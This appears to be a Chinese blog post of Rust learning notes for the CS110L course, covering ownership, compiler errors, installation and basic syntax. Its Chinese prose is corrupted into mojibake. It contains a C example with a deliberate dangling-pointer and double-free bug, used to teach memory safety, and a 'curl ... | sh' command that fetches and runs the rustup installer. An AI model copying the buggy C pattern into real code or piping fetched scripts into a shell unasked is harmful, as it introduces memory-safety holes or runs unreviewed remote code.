class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>  Vec* vec = vec_new();<br>  vec_push(vec, <span class="hljs-number">107</span>);<br><br>  <span class="hljs-type">int</span>* n = &amp;vec-&gt;data[<span class="hljs-number">0</span>];<br>  vec_push(vec, <span class="hljs-number">110</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, *n);<br><br>  <span class="hljs-built_in">free</span>(vec-&gt;data);<br>  vec_free(vec);<br>&#125;<br></code></pre></td></tr></table></figure><p>ğŸ‘´ğŸ»ğŸ‘‹ğŸ»ä¼šäº†ï¼ŒğŸ‘´ğŸ»æ˜¯èœç‹—</p></li></ul><h2 id="Rust-çš„ä¸€äº›ç‰¹ç‚¹"><a class="header-anchor" href="#Rust-çš„ä¸€äº›ç‰¹ç‚¹">Â¶</a>Rust çš„ä¸€äº›ç‰¹ç‚¹</h2><ul><li>ä¸ºäº†ä½¿ç¨‹åºç›¸å¯¹å®‰å…¨ï¼Œæˆ‘ä»¬å†™ä»£ç çš„æ—¶å€™ä¼šå—åˆ° rust è®¾ç«‹çš„ä¸€äº›é™åˆ¶ï¼Œå¯¼è‡´æœ‰äº›ç¨‹åºå†™èµ·æ¥éå¸¸å›°éš¾ç”šè‡³éš¾ä»¥å®ç°</li><li>rust çš„å®‰å…¨ä¿éšœå¤§å¤šæ¥è‡ªç¼–è¯‘å™¨çš„æ£€æŸ¥</li><li>rust çš„ç¼–è¯‘å™¨ä¼˜åŒ–æœ‰æ—¶ä¼šè®©ç¼–è¯‘å‡ºæ¥çš„ç¨‹åºæ€§èƒ½ç”šè‡³ä¼˜äº C</li></ul><h2 id="Rust-ä¸­çš„-OwnerShip-Rules"><a class="header-anchor" href="#Rust-ä¸­çš„-OwnerShip-Rules">Â¶</a>Rust ä¸­çš„ OwnerShip Rules</h2><ul><li>Rust ä¸­çš„æ‰€æœ‰å€¼éƒ½æœ‰è‡ªå·±çš„ owner å˜é‡</li><li>ä¸€ä¸ªå€¼åŒä¸€æ—¶é—´åªèƒ½æœ‰ä¸€ä¸ª owner</li><li>å½“ owner (å˜é‡)ç¦»å¼€ä½œç”¨åŸŸèŒƒå›´æ—¶ï¼Œè¿™ä¸ªå€¼å°†è¢«ä¸¢å¼ƒ(drop)</li></ul><h2 id="ä¸Šä¸‹æ–‡ä¸­çš„-OwnerShip"><a class="header-anchor" href="#ä¸Šä¸‹æ–‡ä¸­çš„-OwnerShip">Â¶</a>ä¸Šä¸‹æ–‡ä¸­çš„ OwnerShip</h2><p><a href="https://play.rust-lang.org/">Rust Playground</a></p><h3 id="String"><a class="header-anchor" href="#String">Â¶</a>String</h3><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>()&#123;<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">s</span>: <span class="hljs-type">String</span> = <span class="hljs-string">&quot;im a lil string&quot;</span>.<span class="hljs-title function_ invoke__">to_string</span>();<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">u</span> = s;<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;&#123;&#125;&quot;</span>, s);<span class="hljs-comment">// println!(&quot;&#123;&#125;&quot;,u) compiles just fine!</span><br>&#125;<br></code></pre></td></tr></table></figure><p>æŠ¥é”™å¦‚ä¸‹ï¼š</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs rust">warning: unused variable: `u`<br> -<span class="hljs-punctuation">-&gt;</span> src/main.rs:<span class="hljs-number">3</span>:<span class="hljs-number">9</span><br>  |<br><span class="hljs-number">3</span> |     <span class="hljs-keyword">let</span> <span class="hljs-variable">u</span> = s;<br>  |         ^ help: <span class="hljs-keyword">if</span> this is intentional, prefix it with an underscore: `_u`<br>  |<br>  = note: `<span class="hljs-meta">#[warn(unused_variables)]</span>` on by default<br><br>error[E0382]: borrow of moved value: `s`<br> -<span class="hljs-punctuation">-&gt;</span> src/main.rs:<span class="hljs-number">4</span>:<span class="hljs-number">20</span><br>  |<br><span class="hljs-number">2</span> |     <span class="hljs-keyword">let</span> <span class="hljs-variable">s</span>: <span class="hljs-type">String</span> = <span class="hljs-string">&quot;im a lil string&quot;</span>.<span class="hljs-title function_ invoke__">to_string</span>();<br>  |         - <span class="hljs-keyword">move</span> occurs because `s` has <span class="hljs-keyword">type</span> `<span class="hljs-type">String</span>`, which does not implement the `<span class="hljs-built_in">Copy</span>` <span class="hljs-keyword">trait</span><br><span class="hljs-number">3</span> |     <span class="hljs-keyword">let</span> <span class="hljs-variable">u</span> = s;<br>  |             - value moved here<br><span class="hljs-number">4</span> |     <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;&#123;&#125;&quot;</span>, s);    <span class="hljs-comment">// println!(&quot;&#123;&#125;&quot;,u) compiles just fine!</span><br>  |                    ^ value borrowed here after <span class="hljs-keyword">move</span><br>  |<br>  = note: this error originates <span class="hljs-keyword">in</span> the <span class="hljs-keyword">macro</span> `$crate::format_args_nl` which comes from the expansion of the <span class="hljs-keyword">macro</span> `println` (<span class="hljs-keyword">in</span> Nightly builds, run with -Z <span class="hljs-keyword">macro</span>-backtrace <span class="hljs-keyword">for</span> <span class="hljs-variable">more</span> <span class="hljs-keyword">in</span>fo)<br></code></pre></td></tr></table></figure><p><code>let u = s</code> è¿‡ç¨‹ä¸­å‘ç”Ÿäº† String çš„æ‰€æœ‰æƒä¼ é€’ï¼Œè€Œ String æ²¡æœ‰å®ç° <code>Copy</code> traitï¼ˆå…·æœ‰ <code>Copy</code> trait çš„å˜é‡èµ‹å€¼æ‰€æœ‰æƒä¸æ˜¯è½¬ç§»è€Œæ˜¯å¤åˆ¶ï¼‰ï¼Œs æ­¤æ—¶ä¸å†å…·æœ‰è¯¥ String çš„ Ownershipï¼ŒæŠ¥é”™ã€‚</p><h3 id="function"><a class="header-anchor" href="#function">Â¶</a>function</h3><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">om_nom_nom</span>(s: <span class="hljs-type">String</span>)&#123;<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;I have consumed &#123;&#125;&quot;</span>,s);<br>&#125;<br><br><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>()&#123;<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">s</span>: <span class="hljs-type">String</span> = <span class="hljs-string">&quot;im a lil string&quot;</span>.<span class="hljs-title function_ invoke__">to_string</span>();<br>    <span class="hljs-title function_ invoke__">om_nom_nom</span>(s);<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;&#123;&#125;&quot;</span>,s);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs rust">error[E0382]: borrow of moved value: `s`<br> -<span class="hljs-punctuation">-&gt;</span> src/main.rs:<span class="hljs-number">8</span>:<span class="hljs-number">19</span><br>  |<br><span class="hljs-number">6</span> |     <span class="hljs-keyword">let</span> <span class="hljs-variable">s</span>: <span class="hljs-type">String</span> = <span class="hljs-string">&quot;im a lil string&quot;</span>.<span class="hljs-title function_ invoke__">to_string</span>();<br>  |         - <span class="hljs-keyword">move</span> occurs because `s` has <span class="hljs-keyword">type</span> `<span class="hljs-type">String</span>`, which does not implement the `<span class="hljs-built_in">Copy</span>` <span class="hljs-keyword">trait</span><br><span class="hljs-number">7</span> |     <span class="hljs-title function_ invoke__">om_nom_nom</span>(s);<br>  |                - value moved here<br><span class="hljs-number">8</span> |     <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;&#123;&#125;&quot;</span>,s);<br>  |                   ^ value borrowed here after <span class="hljs-keyword">move</span><br>  |<br>  = note: this error originates <span class="hljs-keyword">in</span> the <span class="hljs-keyword">macro</span> `$crate::format_args_nl` which comes from the expansion of the <span class="hljs-keyword">macro</span> `println` (<span class="hljs-keyword">in</span> Nightly builds, run with -Z <span class="hljs-keyword">macro</span>-backtrace <span class="hljs-keyword">for</span> <span class="hljs-variable">more</span> <span class="hljs-keyword">in</span>fo)<br><br></code></pre></td></tr></table></figure><p><code>om_nom_nom(s)</code> å‘ç”Ÿäº† String çš„æ‰€æœ‰æƒä¼ é€’ï¼Œs æ­¤æ—¶ä¸å†å…·æœ‰è¯¥ String çš„ Ownershipï¼ŒæŠ¥é”™ã€‚</p><h3 id="u32"><a class="header-anchor" href="#u32">Â¶</a>u32</h3><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">om_nom_nom</span>(n: <span class="hljs-type">u32</span>)&#123;<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;&#123;&#125; is a very nice number&quot;</span>,n);<br>&#125;<br><br><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>()&#123;<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">n</span>: <span class="hljs-type">u32</span> = <span class="hljs-number">110</span>;<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">m</span> = n;<br>    <span class="hljs-title function_ invoke__">om_nom_nom</span>(m);<br>    <span class="hljs-title function_ invoke__">om_nom_nom</span>(n);<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;&#123;&#125;&quot;</span>,m+n);<br>&#125;<br></code></pre></td></tr></table></figure><p>u32 å…·æœ‰ <code>Copy</code> traitï¼Œæ‰€æœ‰æƒå‘ç”Ÿäº†å¤åˆ¶è€Œä¸æ˜¯ä¼ é€’ï¼Œç¨‹åºæ­£å¸¸è¿è¡Œã€‚</p><h2 id="æ›´å¤šæœ‰å…³-OwnerShip"><a class="header-anchor" href="#æ›´å¤šæœ‰å…³-OwnerShip">Â¶</a>æ›´å¤šæœ‰å…³ OwnerShip</h2><ul><li><a href="https://course.rs/basic/ownership/index.html">æ‰€æœ‰æƒä¸å€Ÿç”¨</a></li></ul><h1>Week 1 Exercises: Hello world</h1><h2 id="Purpose"><a class="header-anchor" href="#Purpose">Â¶</a>Purpose</h2><ul><li>å®‰è£…å¥½ rust ç¯å¢ƒï¼Œä»ä»£ç ç¼–è¯‘è¿è¡Œ rust ç¨‹åº</li><li>ç†Ÿæ‚‰ rust åŸºæœ¬è¯­æ³•</li></ul><h2 id="Part-1-Getting-oriented"><a class="header-anchor" href="#Part-1-Getting-oriented">Â¶</a>Part 1: Getting oriented</h2><p>æŒ‰ç…§ <a href="https://www.rust-lang.org/tools/install">å®˜æ–¹</a> ç»™å‡ºçš„å®‰è£…å»ºè®®ï¼Œæˆ‘æ˜¯ wsl2 å°±ä½¿ç”¨çš„ä»¥ä¸‹å‘½ä»¤ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl --proto <span class="hljs-string">&#x27;=https&#x27;</span> --tlsv1.2 -sSf https://sh.rustup.rs | sh<br></code></pre></td></tr></table></figure><p>å…¶å® UNIX ç³»ç»Ÿåº”è¯¥ä½¿ç”¨ä¸‹é¢å‘½ä»¤å°±éƒ½èƒ½å®‰è£…ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl https://sh.rustup.rs -sSf | sh<br></code></pre></td></tr></table></figure><p>è£…å¥½å<strong>å¼€ä¸ªæ–°çš„ shell æ¥åŠ è½½ä¸‹ç¯å¢ƒå˜é‡</strong>å°± okã€‚</p><p>ç„¶å git clone ç»™çš„ä»“åº“ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/reberhardt7/cs110l-spr-2020-starter-code.git<br></code></pre></td></tr></table></figure><p>åœ¨æ–‡ä»¶å¤¹ä¸‹è¿è¡Œ <code>cargo build</code> å³å¯ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">â¯ ./target/debug/hello-world<br>Hello, world!<br></code></pre></td></tr></table></figure><p>æ›´æ”¹ä¸‹æ–‡ä»¶å†…å®¹ï¼Œ<code>cargo run</code>ï¼š</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() &#123;<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;Goodbye,World!&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">â¯ cargo run<br>   Compiling hello-world v0.1.0 (path/cs110l-spr-2020-starter-code/week1/part-1-hello-world)<br>    Finished dev [unoptimized + debuginfo] target(s) <span class="hljs-keyword">in</span> 0.29s<br>     Running `target/debug/hello-world`<br>Goodbye,World!<br></code></pre></td></tr></table></figure><p>å†æˆ–è€…ç”¨ <code>rustc</code>ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">â¯ rustc main.rs<br>â¯ ll<br>total 3.9M<br>-rwxr-xr-x 1 nightu nightu 3.9M Nov  4 22:13 main<br>-rw-r--r-- 1 nightu nightu   46 Nov  4 21:59 main.rs<br>â¯ ./main<br>Goodbye,World!<br></code></pre></td></tr></table></figure><h2 id="Part-2-Rust-warmup"><a class="header-anchor" href="#Part-2-Rust-warmup">Â¶</a>Part 2: Rust warmup</h2><h3 id="Syntax"><a class="header-anchor" href="#Syntax">Â¶</a>Syntax</h3><p>æ•°å­—ç±»å‹: æœ‰ç¬¦å·çš„ <code>i8, i16, i32, i64</code>ï¼Œæ— ç¬¦å·çš„ <code>u8, u16, u32, u64</code>ã€‚æŒºå¥½è®°çš„ XDï¼Œæ•°å­—å°±æ˜¯ä½æ•°ï¼ˆbit ä½ï¼‰çš„æ„æ€ã€‚</p><p>å£°æ˜å˜é‡çš„è¯ï¼Œç”¨ <code>let</code> å…³é”®å­—ï¼Œå¹¶è¡¨æ˜å˜é‡ç±»å‹ï¼š</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-comment">// Declare a variable containing a signed 32-bit number. (Equivalent to</span><br><span class="hljs-comment">// &quot;int n = 1&quot; in C)</span><br><span class="hljs-keyword">let</span> <span class="hljs-variable">n</span>: <span class="hljs-type">i32</span> = <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>åŒæ—¶ï¼ŒRust æœ‰ä¸ªç‰¹æ€§å« <em>type inference</em>ã€‚å½“ rust å¯ä»¥æ¨æ–­å‡ºä½ æ‰€å†™çš„å˜é‡ç±»å‹çš„æ—¶å€™ï¼Œä½ å¯ä»¥çœç•¥å˜é‡ç±»å‹è¿›è¡Œå˜é‡å£°æ˜ã€‚</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">let</span> <span class="hljs-variable">n</span> = <span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure><p>ä½†æ˜¯æ¶‰åŠåˆ°æ— ç¬¦å·æ•´æ•°æ—¶éœ€è¦æ‰‹åŠ¨æŒ‡å®šï¼š</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>()&#123;<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">n1</span>: <span class="hljs-type">u32</span> = <span class="hljs-number">0xdeadbeef</span>;<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">n2</span>: <span class="hljs-type">u32</span> = <span class="hljs-number">0xcafebabe</span>;<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">s1</span> = <span class="hljs-string">&quot;nightu&quot;</span>;<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;&#123;0&#125; and &#123;2&#125; &#123;1&#125;&quot;</span>,s1,n2,n1);<br>    <span class="hljs-comment">// 0, 2, 1 are the index of the following args</span><br>&#125;<br></code></pre></td></tr></table></figure><p>ä¸ç„¶ä¼šæŠ¥å¦‚ä¸‹é”™è¯¯:</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs rust">error: literal out of range <span class="hljs-keyword">for</span> `<span class="hljs-type">i32</span>`<br> -<span class="hljs-punctuation">-&gt;</span> src/main.rs:<span class="hljs-number">3</span>:<span class="hljs-number">14</span><br>  |<br><span class="hljs-number">3</span> |     <span class="hljs-keyword">let</span> <span class="hljs-variable">n2</span> = <span class="hljs-number">0xcafebabe</span>;<br>  |              ^^^^^^^^^^<br>  |<br>  = note: `<span class="hljs-meta">#[deny(overflowing_literals)]</span>` on by default<br>  = note: the literal `<span class="hljs-number">0xcafebabe</span>` (decimal `<span class="hljs-number">3405691582</span>`) does not fit into the <span class="hljs-keyword">type</span> `<span class="hljs-type">i32</span>` and will <span class="hljs-keyword">become</span> `-<span class="hljs-number">889275714i32</span>`<br>  = help: consider using the <span class="hljs-keyword">type</span> `<span class="hljs-type">u32</span>` instead<br></code></pre></td></tr></table></figure><p>ä¸å¤§å¤šæ•°è¯­è¨€ä¸åŒï¼Œ<strong>Rust çš„å˜é‡é»˜è®¤æ˜¯å¸¸é‡</strong>ã€‚æ·»åŠ  <code>mut</code> å…³é”®å­—ä½¿å˜é‡å¯å˜ï¼š</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">n</span> = <span class="hljs-number">0</span>;<br>n = n + <span class="hljs-number">1</span>;  <span class="hljs-comment">// compiles fine</span><br></code></pre></td></tr></table></figure><p>Rust çš„å­—ç¬¦ä¸²æœ‰ä¸¤ç§ç±»å‹ï¼Œ<code>&amp;str</code> è¡¨ç¤ºæŒ‡å‘å†…å­˜ä¸­æŸå¤„ä¸å¯å˜çš„å­—ç¬¦ä¸²å¸¸é‡ï¼Œ<code>String</code> å‚¨å­˜ä¸€ä¸ªå †ä¸Šçš„å­—ç¬¦ä¸²ï¼Œåœ¨åŠ äº† <code>mut</code> çš„æƒ…å†µä¸‹å¯ä»¥è¿›è¡Œæ›´æ”¹ï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">let s: &amp;str = <span class="hljs-string">&quot;Hello world&quot;</span>;    <span class="hljs-regexp">//</span> the <span class="hljs-string">&quot;: &amp;str&quot;</span> annotation is optional<br></code></pre></td></tr></table></figure><p>ä¸Šé¢æ˜¯ <code>&amp;str</code> æƒ…å½¢ï¼Œè¿™é‡Œçš„ s æ˜¯åªè¯»æŒ‡é’ˆï¼Œ<code>&quot;Hello world&quot;</code> å­—ç¬¦ä¸²å‚¨å­˜çš„æ•°æ®æ®µä¹Ÿæ˜¯åªè¯»æƒé™ã€‚</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">s</span>: <span class="hljs-type">String</span> = <span class="hljs-type">String</span>::<span class="hljs-title function_ invoke__">from</span>(<span class="hljs-string">&quot;Hello &quot;</span>); <span class="hljs-comment">// &quot;String&quot; type annotation is optional</span><br>s.<span class="hljs-title function_ invoke__">push_str</span>(<span class="hljs-string">&quot;world!&quot;</span>);<br></code></pre></td></tr></table></figure><p>ä¸Šé¢åˆ™æ˜¯ <code>String</code> æƒ…å½¢ï¼Œå¯ä»¥åœ¨åé¢å¢åŠ å­—ç¬¦ä¸²ã€‚ç¬¬ä¸€è¡Œåœ¨å †ä¸Šåˆ†é…å‚¨å­˜å­—ç¬¦ä¸²çš„å†…å­˜ï¼Œåœ°å€è¿”å›ç»™ s æŒ‡é’ˆï¼Œç¬¬äºŒè¡ŒæŠŠå­—ç¬¦ä¸²é™„åŠ åˆ°åˆ†é…çš„å†…å­˜ï¼Œå¿…è¦æ—¶è°ƒæ•´ä½ç½®/å †å—å¤§å°ã€‚å­—ç¬¦ä¸²å¼€è¾Ÿçš„å†…å­˜ä¼šåœ¨è¯¥å­—ç¬¦ä¸²è¢«ä½¿ç”¨çš„æœ€åä¸€è¡Œåè¢«é‡Šæ”¾ã€‚</p><p>ä½¿ç”¨å‘é‡æ˜¯å­˜å‚¨ä¸€ç³»åˆ—çš„äº‹ç‰©æœ€ç®€å•çš„æ–¹æ³•ï¼š</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">v</span>: <span class="hljs-type">Vec</span>&lt;<span class="hljs-type">i32</span>&gt; = <span class="hljs-type">Vec</span>::<span class="hljs-title function_ invoke__">new</span>();<br>v.<span class="hljs-title function_ invoke__">push</span>(<span class="hljs-number">2</span>);<br>v.<span class="hljs-title function_ invoke__">push</span>(<span class="hljs-number">3</span>);<br><span class="hljs-comment">// Even here, the &quot;: Vec&lt;i32&gt;&quot; type annotation is optional. If you omit it, the</span><br><span class="hljs-comment">// compiler will look ahead to see how the vector is being used, and from that, it</span><br><span class="hljs-comment">// can infer the type of the vector elements. Neat!</span><br></code></pre></td></tr></table></figure><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæ‰“å°å‘é‡çš„æ—¶å€™éœ€è¦ç”¨ <code>&#123;:?&#125;</code> æˆ–è€… <code>&#123;:#?&#125;</code> ï¼Œè€Œä¸èƒ½ä½¿ç”¨é»˜è®¤ï¼š</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>()&#123;<br>    <span class="hljs-comment">// let mut v: Vec&lt;i32&gt; = Vec::new();</span><br>    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">v</span> = <span class="hljs-type">Vec</span>::<span class="hljs-title function_ invoke__">new</span>();<br>    v.<span class="hljs-title function_ invoke__">push</span>(<span class="hljs-number">2</span>);<br>    v.<span class="hljs-title function_ invoke__">push</span>(<span class="hljs-number">3</span>);<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;&#123;:?&#125;&quot;</span>,v);<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;&#123;:#?&#125;&quot;</span>,v);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-string">[2, 3]</span><br><span class="hljs-string">[</span><br><span class="hljs-string">    2,</span><br><span class="hljs-string">    3,</span><br><span class="hljs-string">]</span><br></code></pre></td></tr></table></figure><p>Rust çš„æ•°ç»„æŠŠå¤§å°å½“åšç±»å‹çš„ä¸€éƒ¨åˆ†ï¼š</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs Rust"><span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">arr</span>: [<span class="hljs-type">i32</span>; <span class="hljs-number">4</span>] = [<span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">4</span>, <span class="hljs-number">8</span>];<br>arr[<span class="hljs-number">0</span>] = -<span class="hljs-number">2</span>;<br><span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;&#123;&#125;&quot;</span>, arr[<span class="hljs-number">0</span>] + arr[<span class="hljs-number">1</span>]);<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨è¿­ä»£å™¨éå†æ•°ç»„ï¼š</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">for</span> <span class="hljs-variable">i</span> <span class="hljs-keyword">in</span> v.<span class="hljs-title function_ invoke__">iter</span>() &#123; <span class="hljs-comment">// v is the vector from above</span><br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;&#123;&#125;&quot;</span>, i);<br>&#125;<br></code></pre></td></tr></table></figure><p>Rust æ”¯æŒ while å¾ªç¯ï¼š</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">while</span> i &lt; <span class="hljs-number">20</span> &#123;<br>    i += <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>Rust è¿˜æ”¯æŒ <strong>loop</strong> å¾ªç¯ï¼š</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">i</span> = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">loop</span> &#123;<br>    i += <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">if</span> i == <span class="hljs-number">10</span> &#123; <span class="hljs-keyword">break</span>; &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>while å’Œ loop çš„åŒºåˆ«ï¼š</p><ul><li><p><strong>1.</strong> loop å¯ä»¥åœ¨å¾ªç¯æ—¶ç»™æœªåˆå§‹åŒ–çš„å˜é‡èµ‹å€¼è€Œä¸ä¼šæŠ¥é”™</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>()&#123;<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">x</span>;<br>    <span class="hljs-keyword">loop</span> &#123; x = <span class="hljs-number">0x233</span>; <span class="hljs-keyword">break</span>; &#125;<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;0x&#123;:04x&#125;&quot;</span>, x);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">0x0233<br></code></pre></td></tr></table></figure><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 